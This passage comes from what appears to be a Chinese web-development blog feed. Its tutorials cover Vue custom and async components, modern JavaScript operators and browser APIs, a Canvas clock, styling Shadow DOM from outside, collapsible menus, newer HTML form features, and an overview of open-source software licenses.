转换为自定义元素构造器 const ExampleElement = defineCustomElement(Example) // 注册 customElements.define('my-example', ExampleElement) 基于 Vue 构建自定义元素库 按元素分别导出构造函数，以便用户可以灵活地按需导入它们，还可以通过导出一个函数来方便用户自动注册所有元素。 // Vue 自定义元素库的入口文件 import { defineCustomElement } from 'vue' import Foo from './MyFoo.ce.vue' import Bar from './MyBar.ce.vue' const MyFoo = defineCustomElement(Foo) const MyBar = defineCustomElement(Bar) // 分别导出元素 export { MyFoo, MyBar } export function register() { customElements.define('my-foo', MyFoo) customElements.define('my-bar', MyBar) } defineComponent() 用来在定义 Vue 组件时为 TypeScript 提供类型推导的辅助函数。 对于一个 ts 文件，如果我们直接写 export default {}，无法有针对性的提示 vue 组件里应该有哪些属性。 但是，增加一层 defineComponet 的话，export default defineComponent({})，就可以对参数进行一些类型推导和属性的提示等操作。 function defineComponent( component: ComponentOptions | ComponentOptions['setup'] ): ComponentConstructor 参数是一个组件选项对象。返回值将是该选项对象本身，因为该函数实际上在运行时没有任何操作，仅用于提供类型推导，注意返回值的类型有一点特别：它是一个构造函数类型，它是根据选项推断出的组件实例类型。这是为了能让该返回值在 TSX 中用作标签时提供类型推导支持。 你可以像这样从 defineComponent() 的返回类型中提取出一个组件的实例类型 (与其选项中的 this 的类型等价)： const Foo = defineComponent(/* ... */) type FooInstance = InstanceType&lt;typeof Foo&gt; defineAsyncComponent() 用来定义一个异步组件。在大型项目中，我们可能需要拆分应用为更小的块，并仅在需要时再从服务器加载相关组件。defineAsyncComponent 在运行时是懒加载的，参数可以是一个返回 Promise 的异步加载函数（resolve 回调方法应该在从服务器获得组件定义时调用），或是对加载行为进行更具体定制的一个选项对象。 import { defineAsyncComponent } from 'vue' const AsyncComp = defineAsyncComponent(() =&gt; { return new Promise((resolve, reject) =&gt; { // ...从服务器获取组件 resolve(/* 获取到的组件 */) }) }) // ... 像使用其他一般组件一样使用 `AsyncComp` // 也可以使用 ES 模块动态导入 const AsyncComp = defineAsyncComponent(() =&gt; import('./components/MyComponent.vue') ) 得到的 AsyncComp 是一个外层包装过的组件，仅在页面需要它渲染时才会调用加载内部实际组件的函数。它会将接收到的 props 和插槽传给内部组件，所以你可以使用这个异步的包装组件无缝地替换原始组件，同时实现延迟加载。 与普通组件一样，异步组件可以使用 app.component() 全局注册： app.component('MyComponent', defineAsyncComponent(() =&gt; import('./components/MyComponent.vue') )) 也可以直接在父组件中直接定义它们： &lt;script setup&gt; import { defineAsyncComponent } from 'vue' const AdminPage = defineAsyncComponent(() =&gt; import('./components/AdminPageComponent.vue') ) &lt;/script&gt; &lt;template&gt; &lt;AdminPage /&gt; &lt;/template&gt; 异步操作不可避免地会涉及到加载和错误状态，因此 defineAsyncComponent() 也支持在高级选项中处理这些状态： const AsyncComp = defineAsyncComponent({ // 加载函数 loader: () =&gt; import('./Foo.vue'), // 加载异步组件时使用的组件 loadingComponent: LoadingComponent, // 展示加载组件前的延迟时间，默认为 200ms delay: 200, // 加载失败后展示的组件 errorComponent: ErrorComponent, // 如果提供了一个时间限制，并超时了，也会显示这里配置的报错组件，默认值是：Infinity timeout: 3000 }) GitHub 源码 Vue3 中使用 defineCustomElement 自定义组件 ","link":"https://zkrisj.github.io/post/vue3-zhong-shi-yong-definecustomelement-ding-yi-zu-jian/"},{"title":"几个新的高效浏览器原生 JS 运算符","content":"介绍 运算符包括赋值，比较，算数，位运算，逻辑，模板字符串，三元等。 空值合并 从 chrome 80 开始支持，空值合并运算符（??）是一个逻辑运算符，当左侧的操作数为 null 或者 undefined 时，返回其右侧操作数，否则返回左侧操作数。 与布尔逻辑或运算符（||）不同，布尔逻辑或运算符会在左侧操作数为假值时返回右侧操作数。也就是说，如果使用 || 来为某些变量设置默认值，可能会遇到意料之外的行为，比如为假值 ''、0 或 NaN 时同样会返回右侧操作数。 null ?? 'default' // default '' ?? 'default' // '' 1 ?? 'default' // 1 NaN ?? 'default' // NaN '' || 'default' // default NaN || 'default' // default 与布尔逻辑或（||）、布尔逻辑与（&amp;&amp;）运算符相同，当左表达式不为 null 或 undefined 时，不会对右表达式进行求值。 function A() { console.log('函数 A 被调用了'); return undefined; } function B() { console.log('函数 B 被调用了'); return false; } function C() { console.log('函数 C 被调用了'); return &quot;foo&quot;; } console.log( A() ?? C() ); // 依次打印 &quot;函数 A 被调用了&quot;、&quot;函数 C 被调用了&quot;、&quot;foo&quot; // A() 返回了 undefined，所以运算符两边的表达式都被执行了 console.log( B() ?? C() ); // 依次打印 &quot;函数 B 被调用了&quot;、&quot;false&quot; // B() 返回了 false（既不是 null 也不是 undefined） // 所以右侧表达式没有被执行 目前，空值合并运算符和其他逻辑运算符之间的运算优先级/运算顺序是未定义的，将它们组合使用会抛出 SyntaxError。但是，可以使用括号来显式指定运算优先级。 null || undefined ?? &quot;foo&quot;; // SyntaxError true || undefined ?? &quot;foo&quot;; // SyntaxError (null || undefined ) ?? &quot;foo&quot;; // foo 可选链 从 chrome 80 开始支持，可选链运算符（?.）的功能类似于 . 链式运算符，不同之处在于，?. 运算符不必明确验证链中的每个引用是否有效，在引用为空 (null 或者 undefined) 的情况下不会引起错误。当尝试访问可能不存在的对象属性时，可选链运算符将会使表达式更短、更简明。在探索一个对象的内容时，如果不能确定哪些属性必定存在，可选链运算符是很有帮助的。 obj.val?.prop // 使用方括号与属性名表示法 obj.val?.[expr] // 调用可选链函数 obj.func?.(args) 当在表达式中使用可选链时，如果左操作数是 null 或 undefined，表达式将不会被继续计算。 const potentiallyNullObj = null; let x = 0; const prop = potentiallyNullObj?.[x++]; console.log(x); // x 将不会被递增，依旧输出 0 potentiallyNullObj?.a.b; // 不会引起错误，因为在第一个可选链已经终止计算 // 如果对可选链的一部分进行分组，则仍将计算后续的属性 (potentiallyNullObj?.a).b; // TypeError: Cannot read properties of undefined (reading 'b') 不能用于赋值。 const object = {}; object?.property = 1; // SyntaxError: Invalid left-hand side in assignment 不能用于未声明的变量。 undeclaredVar?.prop; // ReferenceError 可选链联合空值合并使用： const customer = {}; const customerCity = customer?.city ?? &quot;Unknown&quot;; console.log(customerCity); // Unknown 求幂 求幂运算符（**）返回将第一个操作数加到第二个操作数的幂的结果。 等效于 Math.pow，不同之处在于它也接受 BigInt 作为操作数。 求幂运算符是右结合的: a ** b ** c 等于 a ** (b ** c)。 不能将一个一元运算符（+/-/~/!/delete/void/typeof）放在基数前，这样会导致一个不明确的求幂表达式，抛出语法错误。 可以与等号结合，形成一个求幂赋值运算符。 3 ** 4 // 81 10 ** -2 // 0.01 2 ** 3 ** 2 // 512 (2 ** 3) ** 2 // 64 -(2 ** 2) // -4 (-2) ** 2 // 4 -2 ** 2 // SyntaxError let a = 3; a **= 2 // 9 a **= 'hello' // NaN 数字取整 二进制按位非运算符（~）将每个二进制位都变为相反值（将二进制位码 0 变为 1，1 变为 0），可以简单记忆成，一个数与自身的取反值相加，等于 -1。 对一个整数连续两次二进制按位非运算，将得到它自身。 所有的位运算都只对整数有效，当二进制否运算遇到小数时，会将小数部分舍去，只保留整数部分。 所以，对一个小数连续进行两次二进制按位非运算，能达到取整效果。 近似等效于 Math.trunc，但 Math.trunc 对于 NaN 和非数字都返回 NaN，而 ~~ 都返回 0。 使用二进制否运算取整，是所有取整方法中最快的一种。 ~ 3 // -4 ~ -3 // 2 ~ NaN // -1 ~~3 // 3 ~~-2.9 // -2 ~~1.9999 // 1 Math.trunc('a') // NaN Math.trunc(NaN) // NaN ~~'a' // 0 ~~NaN // 0 标签函数 标签函数用来解析模板字符串。当我们使用模板字符串时，模板字符串和占位符表达式被传递给一个默认解析函数。默认函数仅执行字符串插值以替换占位符，然后将部分连接成单个字符串。标签函数即是提供自己的解析函数，在模板文字前加上函数名称（结果称为标记模板），模板文字会被传递给标签函数，然后可以在其中对模板文字的不同部分执行想要的任何操作。 标签函数的第一个参数是包含一个字符串值的数组，它的长度等于占位符表达式的数量加一，因此总是非空的。 为了进一步保证数组值的稳定性，第一个参数和它的 raw 属性都被冻结了，所以不能以任何方式改变它们。 其余的参数是模板字符串中的占位符表达式（${expression}）。 const person = &quot;Mike&quot;; const age = 28; function myTag(strings, personExp, ageExp) { const str0 = strings[0]; // &quot;That &quot; const str1 = strings[1]; // &quot; is a &quot; const str2 = strings[2]; // &quot;.&quot; const ageStr = ageExp &gt; 99 ? &quot;centenarian&quot; : &quot;youngster&quot;; // 还可以返回使用默认模板文本构建的字符串 return `${str0}${personExp}${str1}${ageStr}${str2}`; } const output = myTag`That ${person} is a ${age}.`; console.log(output); // That Mike is a youngster. 标签函数甚至不需要返回字符串。 function template(strings, ...keys) { return (...values) =&gt; { const dict = values[values.length - 1] || {}; const result = [strings[0]]; keys.forEach((key, i) =&gt; { const value = Number.isInteger(key) ? values[key] : dict[key]; result.push(value, strings[i + 1]); }); return result.join(&quot;&quot;); }; } const t1Closure = template`${0}${1}${0}!`; // 相当于 template([&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;!&quot;],0,1,0) t1Closure(&quot;Y&quot;, &quot;A&quot;); // YAY! const t2Closure = template`${0} ${&quot;foo&quot;}!`; // 相当于 template([&quot;&quot;,&quot; &quot;,&quot;!&quot;],0,&quot;foo&quot;); t2Closure(&quot;Hello&quot;, { foo: &quot;World&quot; }); // Hello World! // 相当于 template([&quot;I'm &quot;, &quot;. I'm almost &quot;, &quot; years old.&quot;], &quot;name&quot;, &quot;age&quot;); const t3Closure = template`I'm ${&quot;name&quot;}. I'm almost ${&quot;age&quot;} years old.`; t3Closure({ name: &quot;MDN&quot;, age: 30 }); // I'm MDN. I'm almost 30 years old. 标签也不必是函数，可以是属性访问、函数调用、任何优先级大于 16 的表达式，甚至是另一个标记模板。 console.log`Hello`; // [ 'Hello' ] console.log.bind(null, 2)`Hello`; // 2 [ 'Hello' ] new Function(&quot;console.log(arguments)&quot;)`Hello`; // [Arguments] { '0': [ 'Hello' ] } function recursive(strings, ...values) { console.log(strings, values); return recursive; } recursive`Hello``World`; // [ 'Hello' ] [] // [ 'World' ] [] 可选链会引发语法错误。 console?.log`Hello`; // SyntaxError: Invalid tagged template on optional chain 一个模板字符串标签函数始终使用完全相同的字符串数组参数，无论模板字符串被解析多少次。 const callHistory = []; function tag(strings, ...values) { callHistory.push(strings); return {}; // 返回一个新对象 } function evaluateLiteral() { return tag`Hello, ${&quot;world&quot;}!`; } console.log(callHistory[0] === callHistory[1]); // true console.log(evaluateLiteral() === evaluateLiteral()); // false 每次返回的是一个新对象 const strings = callHistory[0], { raw } = strings; console.log(Object.isExtensible(strings), Object.isExtensible(raw)); // false false 参考资料 MDN Template literals (Template strings) ","link":"https://zkrisj.github.io/post/ji-ge-xin-de-gao-xiao-liu-lan-qi-yuan-sheng-js-yun-suan-fu/"},{"title":"几个新的高效浏览器原生 JS API","content":"介绍 随着浏览器的更新，有些功能，我们使用浏览器自带的 API，而不必依赖第三方库，或使用复杂的代码就可以实现。 复制内容到剪贴板 document.execCommand 只能复制选中状态的文本（getSelection()），而 Clipboard API 提供了完整的响应剪贴板命令（剪切、复制和粘贴）与异步读写系统剪贴板的能力。但当前 document 需要处于焦点状态，例如在控制台使用会报错。 const copyToClipboard = async text =&gt; await navigator.clipboard.writeText(text); 数字转中文 将阿拉伯数字转成中文数字。 const fmt = new Intl.NumberFormat('zh-Hans-CN-u-nu-hanidec'); // 大批量处理数字时可以重复使用 const toCnNumber = number =&gt; fmt.format(number); toCnNumber(123); // 一二三 金额转中文 将阿拉伯数字转成中文金额。 const toCnCurrency = number =&gt; new Intl.NumberFormat('zh-CN', { notation: 'compact',style: 'currency', currency: 'CNY' }).format(number); toCnCurrency(123456789); // ¥1.2亿 公历转农历 将日期转为农历日期。 const toCnDate = date =&gt; date.toLocaleString('zh-u-ca-chinese', { dateStyle: 'full' }) + ' ' + date.toLocaleTimeString(0, { hour12: false }); toCnDate(new Date); // 2022壬寅年九月廿九星期一 21:45:11 生成随机 uuid 在 chrome 92 开始可用，使用加密安全随机数生成器生成 v4 版本 UUID（用连字符分隔的 5 个十六进制的长度 36 位的字符串）。 const uuid = () =&gt; crypto.randomUUID(); uuid(); // 6eae9ae-0ca0-4a78-94c8-0cd2dae671e2 URL 参数解析 解析一个 URL 并返回解析的参数键值对象。 const parseURL = url =&gt; Object.fromEntries([...new URL(url).searchParams]); 深克隆 structuredClone 在 chrome 98 开始可用，深克隆一个可序列化对象（DOM 节点、函数对象都是不可序列化对象），支持克隆递归引用。 const o1 = { a: { b: 1 }, c: 1 }; o1.myself = o1; const o2 = window.structuredClone(o1); o1.a.b = 2; o1.c = 2; console.log(o2.a.b, o2.c , o2.myself === o2, o1.a === o2.a); // 1 1 true false 匹配媒体查询 检测是否匹配当前媒体查询。返回的 MediaQueryList 对象在一个 document 上维持着一系列的媒体查询，并可以使用 change 事件监听媒体查询在其 document 上发生的变化。 const isMatch = media =&gt; window.matchMedia &amp;&amp; window.matchMedia(`(${media})`).matches; isMatch('max-width: 600px'); isMatch('prefers-color-scheme: dark'); 朗读文本 const speechSynthesis = message =&gt; { const msg = new SpeechSynthesisUtterance(message); msg.voice = window.speechSynthesis.getVoices()[0]; window.speechSynthesis.speak(msg); }; speechSynthesis('Hello, World'); 管理 cookie cookieStore 在 chrome 87 开始可用（目前只有 chrome 和 edge 支持），是一个用于管理 cookie 的 API。 await cookieStore.set('cookie1', 'cookie1-value'); const day = 24 * 60 * 60 * 1000; await cookieStore.set({ name: 'cookie2', value: 'cookie2-value', expires: Date.now() + day, domain: '127.0.0.1' }); const cookie = await cookieStore.get('cookie2'); const allCookies = await cookieStore.getAll(); await cookieStore.delete('cookie1'); ","link":"https://zkrisj.github.io/post/ji-ge-xin-de-gao-xiao-liu-lan-qi-yuan-sheng-js-api/"},{"title":"使用 Canvas API 简单制作一个彩色时钟","content":"介绍 &lt;canvas&gt; 最早由 Apple 引入 WebKit，用于 Mac OS X 的 DashBoard，随后被各个浏览器实现。如今，所有主流的浏览器都支持它。Canvas API 提供了一个通过 JavaScript 和 HTML 的 &lt;canvas&gt; 元素来绘制图形的方式。它可以用于动画、游戏画面、数据可视化、图片编辑以及实时视频处理等方面。Canvas 适合绘制大数据量图形元素的图表（如热力图、地理坐标系或平行坐标系上的大规模线图或散点图等），也适合实现某些视觉特效。它还能能够以 png、jpg 或 webp 格式保存图像。Canvas 提供了强大的 Web 绘图能力，所以我们要学会使用它。 创建一个画布 默认情况下 &lt;canvas&gt; 元素没有边框和内容。默认大小为 300 × 150px（宽 × 高），可以使用 width 和 height 属性指定。 &lt;canvas id=&quot;canvas&quot;&gt;&lt;/canvas&gt; 获取画布和半径 为了在 &lt;canvas&gt; 上绘制图形，我们需要使用一个 JavaScript 上下文对象，它能动态创建图像。这里建立了一个 CanvasRenderingContext2D 二维渲染上下文。 const ctx = canvas.getContext('2d'); let radius = canvas.height / 2; 绘制圆周和时钟中心 beginPath() 用来起始一条路径，或重置当前路径。 arc() 用于创建圆形或弧形。 fill() 用来填充图形。 stroke() 用来绘制路径。 function drawFace(context, radius) { context.beginPath(); context.arc(0, 0, radius, 0, 2 * Math.PI); context.fillStyle = 'white'; context.fill(); // 重置路径 画时钟中心圆点 context.beginPath(); context.arc(0, 0, radius * 0.06, 0, 2 * Math.PI); context.fillStyle = 'green'; context.fill(); } 绘制表盘数字 rotate() 用来旋转当前绘图。360 度角等于 Math.PI * 2，Math.PI / 6 就是 30 度角。 translate() 用来将原点移动到新位置。 fillText() 用来绘制文本。 function drawNumbers(context, radius) { context.fillStyle = 'green'; context.font = radius * 0.15 + 'px arial'; context.textBaseline = 'middle'; context.textAlign = 'center'; for (let num = 1; num &lt;= 12; num++) { const angle = num * Math.PI / 6; context.rotate(angle); context.translate(0, -radius * 0.82); context.rotate(-angle); context.fillText(num.toString(), 0, 0); context.rotate(angle); context.translate(0, radius * 0.82); context.rotate(-angle); } } 绘制表盘刻度 moveTo() 移动路径到指定点。 lineTo() 添加一个新点，并创建从最后指定点到该点的线条。 function drawLine(context, radius) { context.lineCap = 'butt'; for (let i = 1; i &lt;= 60; i++) { context.strokeStyle = i % 5 === 0 ? 'yellowgreen' : 'lightgray'; context.beginPath(); context.lineWidth = i % 5 === 0 ? radius * 0.03 : radius * 0.02; context.rotate(i * Math.PI / 30); context.moveTo(0, -radius); context.lineTo(0, i % 5 === 0 ? -radius * 0.93 : -radius * 0.96); context.stroke(); context.rotate(-i * Math.PI / 30); } } 绘制表盘时、分、秒针 function drawTime(context, radius) { const date = new Date(); const h = date.getHours(); const m = date.getMinutes(); const s = date.getSeconds(); const hourAngle = (h * Math.PI / 6) + (m * Math.PI / (6 * 60)) + (s * Math.PI / (6 * 60 * 60)); const minuteAngle = (m * Math.PI / 30) + (s * Math.PI / (30 * 60)); const secondAngle = (s * Math.PI / 30); drawHand(context, hourAngle, radius * 0.5, radius * 0.05, 'green'); drawHand(context, minuteAngle, radius * 0.7, radius * 0.04, 'dodgerblue'); drawHand(context, secondAngle, radius * 0.9, radius * 0.02, 'orange'); } function drawHand(context, angle, length, width, color) { context.beginPath(); context.lineWidth = width; context.lineCap = 'round'; // 圆形末端 context.moveTo(0, 0); context.rotate(angle); context.lineTo(0, -length); context.strokeStyle = color; context.stroke(); context.rotate(-angle); } 添加样式 由于 canvas 画圆会有锯齿，这里使用 CSS 样式会更圆润。 canvas { background: green; border-radius: 50%; } 启动时钟 translate(radius, radius) 将位置移动到画布中心。 ctx.translate(radius, radius); radius = radius * 0.9; // 时钟半径 function draw() { drawFace(ctx, radius); drawNumbers(ctx, radius); drawLine(ctx, radius); drawTime(ctx, radius); requestAnimationFrame(draw); } draw(); 马上掘金 ","link":"https://zkrisj.github.io/post/xue-liao-canvas-api-hou-shi-yong-ta-lai-mo-ni-yi-ge-cai-se-shi-zhong/"},{"title":"在外部改变 Shadow DOM 内部的 CSS 样式","content":"介绍 比如，自定义了一个按钮： &lt;ui-button type=&quot;primary&quot;&gt;按钮&lt;/ui-button&gt; 如何在外部修改已定义的 Web Components 的 Shadow DOM 内部样式？下面是两种方法。 使用 CSS 变量 在 Shadow DOM 内部使用 CSS 变量定义样式，然后在使用 Web Components 的地方改变 CSS 变量的值即可改变 Shadow DOM 内部样式。 class UiButton extends HTMLElement { constructor() { super(); const shadow = this.attachShadow({ mode: 'open' }); shadow.innerHTML = ` &lt;style&gt; button { padding: 9px 1em; border: 1px solid; border-radius: var(--ui-button-radius, 4px); background: var(--ui-button-background, #fff); color: var(--ui-button-color, #333); border-color: var(--ui-border-color, #ccc); } &lt;/style&gt; &lt;button part=&quot;button&quot;&gt;${this.textContent}&lt;/button&gt;`; } } customElements.define('ui-button', UiButton); [type=primary] { --ui-button-radius: 1mm; --ui-button-background: deepskyblue; --ui-button-color: #fff; --ui-border-color: lightblue; } 使用 ::part 伪元素 ::part CSS 伪元素表示在 Shadow DOM 中任何匹配 part 属性的元素。只需要在 Shadow DOM 中元素上添加 part 属性，然后在外部使用 ::part 伪元素选择匹配 part 属性的元素改变样式即可。 class UiButton extends HTMLElement { constructor() { super(); this.attachShadow({ mode: 'open' }).innerHTML = ` &lt;style&gt; button { padding: 9px 1em; border: 1px solid #ccc; border-radius: 4px; background: #fff; color: #333; } &lt;/style&gt; &lt;button part=&quot;button&quot;&gt;${this.textContent}&lt;/button&gt;`; } } customElements.define('ui-button', UiButton); [type=primary]::part(button) { border-color: coral; background: orangered; color: #fff; } part 全局属性包含一个以元素中 part 属性名称组成的列表，该列表以空格分隔。 在任意元素（包括 HTMLUnknownElement）上，element.part 都会返回一个 DOMTokenList 对象。所以判断一个元素是否含有 part 属性，不能使用 element.part，要用 Element.hasAttribute('part') 方法。 可以通过 DOM 事件改变 part 属性的值，来动态改变伪元素 ::part 选择的元素的 CSS 样式： 浏览器支持 在安卓手机，苹果手机和 PC 端测试，都可以完全支持，查看到效果。而 is 属性目前只有 Safari 浏览器不支持。 ","link":"https://zkrisj.github.io/post/zai-wai-bu-gai-bian-shadow-dom-nei-bu-de-css-yang-shi/"},{"title":"将列表转化为一个带图标的可折叠/展开的菜单","content":"介绍 将一个无序列表转化为一个带图标的可折叠/展开的菜单。下面是三种实现方法。 使用 Web Components 首先使用 customElements.define() 方法注册一个元素。 customElements.define('expanding-list', ExpandingList, { extends: 'ul' }); 第三个参数是一个包含 extends 属性的配置对象，指定了所创建的元素继承自哪个内置元素，可以继承任何内置元素。 然后，定义这个元素的实现类 ExpandingList，并继承 HTMLUListElement。 class ExpandingList extends HTMLUListElement { constructor() { self = super(); self.querySelectorAll('li').forEach(li =&gt; { if (li.querySelector('ul')) { li.setAttribute('class', 'closed'); const { firstChild } = li; // 使用 span 替换 li 节点文本，并绑定事件 const newSpan = document.createElement('span'); newSpan.textContent = firstChild.textContent; newSpan.onclick = self.showul; firstChild.replaceWith(newSpan); } }); } // 折叠/展开菜单 showul(e) { const nextul = e.target.nextElementSibling; if (nextul.style.display == 'block') { nextul.style.display = 'none'; nextul.parentNode.setAttribute('class', 'closed'); } else { nextul.style.display = 'block'; nextul.parentNode.setAttribute('class', 'open'); } }; } 在页面上使用 &lt;ul&gt; 标签，通过 is 属性指定这个自定义内置元素的名称。 &lt;ul is=&quot;expanding-list&quot;&gt; &lt;/ul&gt; is 全局属性是一种使用 Web 组件的方法，是将自定义元素（实现了 Web 组件逻辑）插入页面的另一种方式。 不是使用自定义元素的名称作为 HTML 标记，而是将名称传递给内置 HTML 元素。 如果 Web 组件没有在页面上注册，该组件仍可以退回到标准 HTML 元素行为。 使用 details 和 summary 标签配合 ::marker 伪元素 &lt;details&gt; 元素可创建一个部件，仅在被切换成展开状态时，它才会显示内含的信息。 &lt;summary&gt; 元素可为 &lt;details&gt; 部件提供显示的标题信息。默认标题信息左边会有一个小三角形图标。 ::marker CSS 伪元素可为设置了 display: list-item 的元素或伪元素上定义样式，例如 &lt;li&gt; 和 &lt;summary&gt;，它们通常含有一个项目符号或者数字。但是，目前只能使用某些 CSS 属性： 所有字体属性 white-space color text-combine-upright, unicode-bidi, direction content 所有 animation 和 transition 属性 使用 input checkbox 和 label 标签 使用单选框以及复选框自带的一些特性，然后配合 CSS 一些特殊的选择器，可以在不使用任何 JavaScript 代码情况下实现元素的显示隐藏、多级下拉列表、选项卡切换效果等。目前兼容性最好。 浏览器支持 目前，Safari 浏览器对前两种方法都不支持。 参考资料 CSS radio/checkbox单复选框元素显隐技术 ","link":"https://zkrisj.github.io/post/jiang-lie-biao-zhuan-hua-wei-yi-ge-dai-tu-biao-de-ke-zhe-die-zhan-kai-de-cai-dan/"},{"title":"form 表单新属性 submitter、新方法 requestSubmit、新事件 formdata","content":"SubmitEvent.submitter 表示发送 submit 事件的表单元素。通常是 type 属性是 submit 的 &lt;input&gt; 元素或者 type 属性是 submit 的 &lt;button&gt; 元素，也可能是启动提交过程的其他元素。 form.addEventListener('submit', (event) =&gt; { const { submitter } = event; console.log(submitter); // 阻止默认的表单提交行为 event.preventDefault(); }); 如果提交不是由表单控件触发的（使用 HTMLFormElement.requestSubmit() 方法），则 submitter 的值是 null。 表单外 HTML 元素通过绑定事件调用 HTMLFormElement.submit() 方法——不会触发表单的 submit 事件（也不会触发表单验证），所以不能通过 SubmitEvent 来获取 submitter 属性。 HTMLFormElement.requestSubmit HTMLFormElement.requestSubmit() 方法会触发表单验证，验证通过后会触发开发者自定义的 submit 事件。 HTMLFormElement.submit() 方法会直接触发表单元素的原生提交——不会触发表单的 submit 事件（也不会触发表单验证），页面会跳转到 action 属性定义的 URL 或刷新（action 属性值为空时）。 语法： requestSubmit() requestSubmit(submitter) 调用 requestSubmit() 时指定的 submitter 参数必须是当前表单元素的后代或者必须具有引用当前表单的 form 属性，否则会抛出 DOMException。 HTMLFormElement: formdata event formdata 事件在构建表示表单数据的条目列表后触发，例如在提交表单时或调用 FormData() 构造函数传入表单元素参数时。 form.addEventListener('submit', (e) =&gt; { e.preventDefault(); // 构造 FormData 对象，触发 formdata 事件 const formData = new FormData(form); console.log(JSON.stringify([...formData])); }); form.addEventListener('formdata', (e) =&gt; { console.log('formdata fired'); const { formData } = e; // 将输入值转成小写 formData.set('field1', formData.get('field1').toLowerCase()); formData.set('field2', formData.get('field2').toLowerCase()); // 追加 name 字段 formData.append('name', 'test'); }); b1.onclick = e =&gt; { // 提交表单，触发 formdata 事件 form.requestSubmit(); } 浏览器支持 原文链接 2022年新出了哪些form表单新特性？ ","link":"https://zkrisj.github.io/post/form-biao-dan-xin-shu-xing-submitterxin-fang-fa-requestsubmitxin-shi-jian-formdata/"},{"title":"总结了一下各类软件许可协议","content":"软件许可证（或软件许可协议）是一种具有法律性质的合同或指导，由软件作者与软件用户签订，用以规定和限制软件用户使用、拷贝、修改和再发布软件（或其源代码）的权利，以及软件作者应尽的义务。 常见许可证及其差异 根据许可证使用时间，软件许可证可分为终身许可证和年度许可证。 终身许可证，顾名思义，便是一旦与软件开发商达成协议，签订合同后可终身无限制的使用该软件。此类许可证多见于个人用户领域。 年度许可证，指的是客户与软件开发商商签订协议，按年付费来使用该软件。此类软件许可证多见于商业软件领域。相比终身许可证，年度许可证不太像是购买软件，而更像是租赁软件使用，不过却更为灵活。 分发（distribution）指将版权作品从一个人转移到另一个人或公司，如果你是自己使用，不提供给他人，就没有分发。云服务（SaaS）不构成分发，即你使用开源软件提供云服务，不必提供源码。但是，Affero GPL (AGPL) 许可证规定云服务也必须提供源码。 常见的许可证主要有 GPL、LGPL、AGPL、MPL、MIT、BSD 和 Apache，各个许可证还包含不同版本。根据使用条件不同，可以将这些许可证大致分为两类：Copyleft 许可证和宽松式许可证（permissive license），主要对使用、修改和分发的场景作出相应约束。 宽松式许可证 最基本的类型，对用户几乎没有限制。 用户可以使用代码，做任何想做的事情，可以修改代码后闭源。 不担保代码质量，用户自担风险。 用户必须披露原始作者。 宽松式许可证都规定分发软件时，必须保留原始的许可证声明，区别在于要求用户遵守的条件不同。 BSD（Berkeley Software Distribution） —— 特点是可以自由使用、修改、再发布。但是在商用或者个人分发过程中必须带有原来代码的许可证，且不能用原作者相关信息去做宣传。 MIT —— 源自麻省理工学院（Massachusetts Institute of Technology, MIT），是使用最广泛的一种开源许可证。其特点和 BSD 许可证类似，只要在项目的所有副本中包含版权声明和许可声明，就无需承担任何责任。 Apache —— 作为宽松式许可证中的一员，Apache 多了几个限制条件，禁止使用其商标与作者的相关信息进行商业行为，必须明确指出所有修改过的文件。 Copyleft 许可证 Copyleft 是一种让程序或其它作品保持自由（是言论自由的自由，而不是“零价格”）的通用方法，并要求对 Copyleft 程序的任何修改和扩展都保持自由。 Copyright 直译是&quot;复制权&quot;，这是版权制度的核心，意为不经许可，用户无权复制。Copyleft 是理查德·斯托曼发明的一个词，与 Copyright 相对，Copyleft 的含义是不经许可，用户可以随意复制。核心是：修改后的 Copyleft 代码不得闭源，比宽松式许可证的限制要多： 如果分发二进制格式，必须提供源码。 修改后的源码，必须与修改前保持许可证一致。 不得在原始许可证以外，附加其他限制。 对用户的限制从最强到最弱排序：AGPL &gt; GPL &gt; LGPL &gt; MPL。 AGPL（Affero 通用公共许可证） —— AGPL 是 GPL 的一个补充，在 GPL 的基础上加了一些限制。GPL 的约束生效前提是该软件 &quot;发布&quot;，有的公司就使用 GPL 组件编写 web 系统，但是不发布系统，只用这个系统在线提供服务，这样就避免了开源系统代码。而 AGPL 要求如果云服务 (即 SaaS) 用到的代码是该许可证，那云服务的代码也必须开源。 GPL（通用公共许可证） —— GPL 和 BSD 区别还是很大的，GPL 主张代码及衍生代码的开源，不允许修改后和衍生的代码做为闭源的商业软件进行发布和出售。如果已发布商业软件源码里含有 GPL 开源软件源码，则必须对该商业软件进行开源或者下架处理。 LGPL（Lesser 通用公共许可证） —— LGPL 允许商业软件通过类库引用的方式使用 LGPL 类库，而不需要开源商业软件源码。 MPL（Mozilla 公共许可证） —— 在商业软件中，如果含有 MPL 许可证的代码在单独的文件内，其他新增的文件就可以避免开源。 如何选择 乌克兰程序员 Paul Bagwell，画了一张分析图，说明应该怎么选择。下面是制作的中文版： 一些示例包括： Apache：需要 Apache 2.0 协议。 Cloud Native Computing Foundation：默认规定 Apache 2.0 协议。 GNU：建议大多数程序使用 GNU GPLv3 协议。 NPM packages：绝大多数使用 MIT 或非常相似的 ISC 协议（等同于 BSD 2 和 MIT）。 OpenBSD：更建议 ISC 协议。 Rust：程序包基本上都同时使用 MIT 和 Apache 2.0 两个协议来授权。 WordPress：插件和主题必须为 GNU GPLv2 协议（或更高版本）。 软件 通常来说，我们推荐使用最 Copyleft 而不影响目的的许可证。对大多数程序，我们推荐使用最新版的 GPL。它强大的 Copyleft 适合所有类型的软件，并对用户的自由有很多保护。为了将来许可证的升级，请声明 “版本 3 或者任何新版本”，这样你的程序就 在许可证层面兼容其他将来按照后续 GPL 版本发布的程序。 小程序 对大多数小程序，使用 Copyleft 是不值得的。我们用300行作为基准：当一个软件包的源码比这个短，Copyleft 带来的好处通常太小，不足以对抗确保许可证的复本总是伴随软件的不便。 对这些程序，我们推荐 Apache 2.0 许可证。这是一个弱的、松散的、“顺从型”（非 Copyleft）软件许可证，它有用于避免贡献者和分发者起诉专利侵权的条目。这并不会让软件避免来自专利的威胁（一个软件许可证是做不到的），但它避免了专利持有者打着自由的幌子发布软件，这种情况下专利持有者会相当于做了一次“诱导转向”，然后要求接受者同意专利证书中的非自由条目。 在不严格的（顺从型）许可证中，Apache 2.0 是最好的；所以如果你要用一个不严格的许可证，不论什么原因，我们推荐用这一个。 库 对于库，我们分三种情形。 如果你是专有应用开发者使用自由标准的库，那么你就应该对这些库使用宽松的许可证，比如 Apache 2.0 许可证，这样专有应用就容易包含这些库。 如果开发者已经使用现有的以非自由或不严格的 pushover 许可证发布的库，那么我们建议使用 Copyleft 许可证 LGPL。较为宽松的 